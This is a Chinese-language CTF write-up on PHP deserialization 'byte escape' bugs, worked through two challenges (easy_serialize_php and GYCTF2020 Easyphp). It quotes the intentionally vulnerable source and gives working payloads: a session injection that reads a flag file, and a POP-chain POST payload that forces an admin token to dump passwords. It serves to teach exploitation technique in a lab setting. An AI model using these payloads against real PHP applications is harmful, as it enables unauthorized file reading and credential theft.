---
title: 【WEB】反序列化字节逃逸
---
# 反序列化字节逃逸

当 PHP 中序列化后的数据进行了长度替换之后，就可能存在这一漏洞，即通过修改输入数据从而控制整个序列化的内容。



**[安洵杯 2019]easy_serialize_php**

题目源码

```
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

在 phpinfo 中发现了文件包含 d0g3_f1ag.php

可以看到在倒数第二行存在一个文件读取

读取的内容是 _SESSION['img'] 

同时存在一个变量覆盖及序列化数据的替换

首先默认的序列化数据是

```
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:14:"highlight_file";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

这里可以控制的部分是 user 和 function 的内容

于是要利用过滤，用 user 吃掉后面的

```
";s:8:"function";s:14:
```

之后在 function 的部分便可以写入数据控制后面的内容了

要吃掉的数据一共是22个，于是 user 的值为 phpphpphpphpphpphpflag

_SESSION[function] 的值为

```
;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:3:"ccc";s:2:"ok";}
```

这里要保证数组内的个数相等，所以要传入两个值

再传入 f = show_image 即可查看文件

之后回显为

```
$flag = 'flag in /d0g3_fllllllag';
```

再次编码查看文件，获得 flag



**[GYCTF2020]Easyphp**

这个也是通过改变序列化字节造成的漏洞，和上一个减少不同，这个是增加字节长度

网站根目录下 www.zip 下载题目

先看这个存放类的 lib.php

在登录时用了 User 类的 login 方法

```
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
        $mysqli=new dbCtrl();
        $this->id=$mysqli->login('select id,password from user where username=?');
        if($this->id){
        $_SESSION['id']=$this->id;
        $_SESSION['login']=1;
        echo "你的ID是".$_SESSION['id'];
        echo "你好！".$_SESSION['token'];
        echo "<script>window.location.href='./update.php'</script>";
        return $this->id;
        }
    }
}
```

而 login 实例化了另一个类 dbCtrl

```
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this->name=$_POST['username'];
        $this->password=$_POST['password'];
        $this->token=$_SESSION['token'];
    }
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
}
```

这是一个执行查询语句的方法，同时 token 要设成 admin 才会返回结果

而 update.php 则使用了 update 方法

```
public function update(){
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
    }
```

这里可以看到第一行反序列化了 getNewinfo()

```
 public function getNewInfo(){
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));
    }
```

以及 Info 类

```
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }
}
```

safe方法

```
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
```

之后实例化了新的类 UpdateHelper

```
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this->sql;
    }
}
```

在这个类里也实例化了 dbCtrl

同时在 User 类里存在

```
public function __destruct(){
    return file_get_contents($this->nickname);//危
}
public function __toString()
{
    $this->nickname->update($this->age);
    return "0-0";
}
```

然后来总结一下出现的魔术方法

```
__construct()    当一个对象创建时被调用
__destruct()     当一个对象销毁时被调用
__toString()     当一个对象被当作一个字符串使用
__call           当调用的方法不存在时触发
```

最终目的是改变 dbCtrl 中的查询语句从而查出账号密码

我们可以看到在 getNewInfo 中存在 safe 方法的替换，改变了序列化数据的长度

UpdateHelper 类的 \__destruct() 首先用通过 echo 调用 __toString，通过将 nickname 实例化为 Info 调用 Info 中的 call

再将 CtrlCase 实例化为 dbCtrl，从而调用 dbCtrl 中的 login 方法

原本在 update() 中序列化的内容为

```
O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";N;}
```

然后通过 safe 的过滤把反序列化数据挤出去，为保证对象个数的一致，这里要写进 CtrlCase 对象

编写以下脚本进行序列化

```
<?php
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    }
class User
{
    public $id;
    public $age="select password,id from user where username=?";
    public $nickname;
}
class UpdateHelper
{
   public $id;
   public $newinfo;
   public $sql;
}
class dbCtrl
{
   public $hostname="127.0.0.1";
   public $dbuser="root";
   public $dbpass="root";
   public $database="test";
   public $name='admin';
   public $password;
   public $mysqli;
   public $token='admin';
}
$d = new dbCtrl();
$i = new Info();
$i->CtrlCase=$d;
$u = new user();
$u->nickname=$i;
$U=new UpdateHelper();
$U->sql=$u;

echo serialize($U);

?>
```

之后作为 CtrlCase 的值传入

```
";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}
```

一共 443 字节

用 80 个单引号和三个 union 挤出这部分

完整payload

```
age=&nickname=''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''unionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}
```